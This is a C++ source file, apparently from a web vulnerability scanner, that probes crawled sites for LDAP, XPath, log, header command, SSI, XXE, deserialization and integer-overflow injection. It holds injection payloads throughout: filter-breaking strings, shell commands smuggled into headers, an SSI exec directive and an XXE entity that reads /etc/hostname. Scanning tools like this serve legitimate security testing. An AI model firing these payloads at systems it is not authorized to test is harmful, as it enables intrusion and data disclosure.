/// @file scanners/advanced_injection.cpp
/// @brief Advanced injection scanners: LDAP injection, XML injection,
///        XPath injection, template injection via headers, log injection,
///        command injection via headers, deserialization indicators,
///        SSRF via PDF/image rendering, Server-Side Include.
#include <regex>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// LDAP Injection.
std::vector<Finding> scan_ldap_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> ldap_payloads = {"*)(uid=*))(|(uid=*", "*)(&", "*)(|(&"};
  const std::vector<std::string> ldap_params = {"username", "user", "uid", "cn", "search"};

  for (const auto& url : crawl.urls) {
    for (const auto& param : ldap_params) {
      std::string sep = url.find('?') != std::string::npos ? "&" : "?";
      auto baseline = http.get(url + sep + param + "=test123xyz");
      for (const auto& payload : ldap_payloads) {
        auto resp = http.get(url + sep + param + "=" + payload);
        // Differential: LDAP attribute strings must appear in response but NOT baseline
        if (resp.status_code == 200 && resp.body != baseline.body && resp.body.size() > baseline.body.size() &&
            (resp.body.find("uid") != std::string::npos || resp.body.find("cn=") != std::string::npos ||
             resp.body.find("dn:") != std::string::npos)) {
          if (!(baseline.body.find("uid") != std::string::npos || baseline.body.find("cn=") != std::string::npos ||
                baseline.body.find("dn:") != std::string::npos)) {
            findings.push_back({"LDAP Injection", "critical", url, "LDAP query manipulated via " + param, param, payload,
                                "Response contains LDAP attributes not present in baseline"});
          }  // end differential check
          return findings;
        }
      }
    }
  }
  return findings;
}

/// XPath Injection.
std::vector<Finding> scan_xpath_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> xpath_payloads = {"' or '1'='1", "'] | //* | //*['", "1 or 1=1"};

  for (const auto& url : crawl.urls) {
    for (const auto& p : crawl.params) {
      if (p.url != url) continue;
      std::string base = p.url + "?" + p.name + "=";
      auto baseline = http.get(base + "normalvalue");
      for (const auto& payload : xpath_payloads) {
        auto resp = http.get(base + payload);
        if (resp.status_code == 200 && resp.body.size() > baseline.body.size() * 2 && resp.body.size() > 100) {
          // Verify size difference is specific to the payload, not inherent page variance
          findings.push_back({"XPath Injection", "high", url, "XPath query manipulated — excessive data returned", p.name, payload,
                              "Response " + std::to_string(resp.body.size()) + " vs baseline " + std::to_string(baseline.body.size())});
          goto next_xpath;
        }
      }
    }
  next_xpath:;
  }
  return findings;
}

/// Log Injection / Log Forging.
std::vector<Finding> scan_log_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  // Inject CRLF + fake log entry via headers
  std::string log_payload = "admin%0d%0a[CRITICAL]%20Unauthorized%20access%20from%20127.0.0.1";

  for (const auto& url : crawl.urls) {
    // Baseline: check if these strings exist in normal response first
    auto baseline = http.get(url);
    auto resp = http.get(url, {{"X-Forwarded-For", "127.0.0.1\r\n[CRITICAL] Fake log entry"}, {"User-Agent", log_payload}});
    // Differential: indicator must appear in payload response but NOT in baseline
    bool has_indicator = (resp.body.find("CRITICAL") != std::string::npos || resp.body.find("Fake log") != std::string::npos);
    if (has_indicator && !(baseline.body.find("CRITICAL") != std::string::npos || baseline.body.find("Fake log") != std::string::npos)) {
      findings.push_back({"Log Injection", "medium", url, "Injected content reflected — potential log forging",
                          "User-Agent/X-Forwarded-For", log_payload, "Injected text found in response (not in baseline)"});
      break;
    }
  }
  return findings;
}

/// Command Injection via headers (Host, User-Agent, Referer).
std::vector<Finding> scan_header_cmdi(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  const std::string canary = "apex_cmdi_" + std::to_string(time(nullptr));
  const std::vector<std::pair<std::string, std::string>> header_payloads = {
      {"User-Agent", "`echo " + canary + "`"},
      {"Referer", "http://test.com/$(echo " + canary + ")"},
      {"X-Forwarded-For", "127.0.0.1; echo " + canary},
  };

  for (const auto& url : crawl.urls) {
    for (const auto& [header, payload] : header_payloads) {
      auto resp = http.get(url, {{header, payload}});
      if (resp.body.find(canary) != std::string::npos) {
        findings.push_back({"Command Injection via Header", "critical", url, "OS command executed via " + header + " header", header,
                            payload, "Canary '" + canary + "' found in response"});
        return findings;
      }
    }
  }
  return findings;
}

/// Insecure Deserialization indicators.
std::vector<Finding> scan_deserialization(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Java serialization magic bytes check
  const std::vector<std::string> deser_paths = {"/api/import",  "/api/data",    "/api/restore",
                                                "/deserialize", "/api/webhook", "/api/callback"};

  // Send Java serialized object header
  std::string java_magic = "\xac\xed\x00\x05";
  for (const auto& path : deser_paths) {
    auto resp = http.post(base + path, java_magic, "application/x-java-serialized-object");
    if (resp.status_code == 500 &&
        (resp.body.find("ClassNotFoundException") != std::string::npos || resp.body.find("InvalidClassException") != std::string::npos ||
         resp.body.find("java.io") != std::string::npos)) {
      findings.push_back({"Insecure Deserialization", "critical", base + path, "Server attempts to deserialize Java objects", "",
                          "Java serialized bytes", "Error: " + resp.body.substr(0, 150)});
      break;
    }
  }

  // PHP deserialization check
  std::string php_payload = "O:8:\"stdClass\":0:{}";
  for (const auto& path : deser_paths) {
    auto resp = http.post(base + path, php_payload, "application/x-www-form-urlencoded");
    if (resp.status_code == 500 &&
        (resp.body.find("unserialize") != std::string::npos || resp.body.find("__wakeup") != std::string::npos)) {
      findings.push_back({"PHP Deserialization", "critical", base + path, "Server processes PHP serialized objects", "", php_payload,
                          "Error: " + resp.body.substr(0, 150)});
      break;
    }
  }
  return findings;
}

/// Server-Side Include (SSI) injection.
std::vector<Finding> scan_ssi(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  std::string ssi_payload = "<!--#exec cmd=\"echo apex_ssi_test\"-->";

  for (const auto& url : crawl.urls) {
    for (const auto& p : crawl.params) {
      if (p.url != url) continue;
      std::string test_url = p.url + "?" + p.name + "=" + ssi_payload;
      auto resp = http.get(test_url);
      if (resp.body.find("apex_ssi_test") != std::string::npos) {
        findings.push_back(
            {"SSI Injection", "critical", url, "Server-Side Include command executed", p.name, ssi_payload, "Output found in response"});
        return findings;
      }
    }
  }
  return findings;
}

/// XML External Entity via content-type switching.
std::vector<Finding> scan_xxe_content_type(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Find POST endpoints that accept JSON, try XML
  const std::vector<std::string> api_paths = {"/api/login", "/api/user", "/api/data", "/api/search", "/api/import"};

  std::string xxe_payload =
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "
      "\"file:///etc/hostname\">]><root><data>&xxe;</data></root>";

  for (const auto& path : api_paths) {
    // Try switching content-type to XML
    auto resp = http.post(base + path, xxe_payload, "application/xml");
    if (resp.status_code == 200 && resp.body.size() > 0 && resp.body.find("error") == std::string::npos &&
        resp.body.find("<") != std::string::npos) {
      // Check if we got file content back
      if (resp.body.find("<?xml") == std::string::npos && resp.body.size() < 200 && resp.body.size() > 1) {
        findings.push_back({"XXE via Content-Type Switch", "critical", base + path,
                            "XML parsed when switching Content-Type from JSON to XML", "", "file:///etc/hostname",
                            resp.body.substr(0, 100)});
        break;
      }
    }
  }
  return findings;
}

/// Integer overflow / large number handling.
std::vector<Finding> scan_integer_overflow(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::string large_num = "99999999999999999999";
  const std::string negative = "-1";

  for (const auto& url : crawl.urls) {
    for (const auto& p : crawl.params) {
      if (p.url != url) continue;
      std::string base = p.url + "?" + p.name + "=";

      // Try large number
      auto resp = http.get(base + large_num);
      if (resp.status_code == 500 || resp.body.find("overflow") != std::string::npos || resp.body.find("integer") != std::string::npos) {
        findings.push_back({"Integer Overflow", "medium", url, "Server crashes or errors with large integer", p.name, large_num,
                            "Status: " + std::to_string(resp.status_code)});
        goto done;
      }

      // Try negative
      auto neg_resp = http.get(base + negative);
      if (neg_resp.status_code == 500) {
        findings.push_back({"Negative Integer Handling", "low", url, "Server errors with negative value", p.name, negative,
                            "Status 500 with negative input"});
        goto done;
      }
    }
  }
done:
  return findings;
}

}  // namespace

std::vector<Scanner> register_advanced_injection_scanners() {
  return {
      {"LDAP Injection", scan_ldap_injection},
      {"XPath Injection", scan_xpath_injection},
      {"Log Injection", scan_log_injection},
      {"Header Command Injection", scan_header_cmdi},
      {"Insecure Deserialization", scan_deserialization},
      {"SSI Injection", scan_ssi},
      {"XXE Content-Type Switch", scan_xxe_content_type},
      {"Integer Overflow", scan_integer_overflow},
  };
}

}  // namespace apex
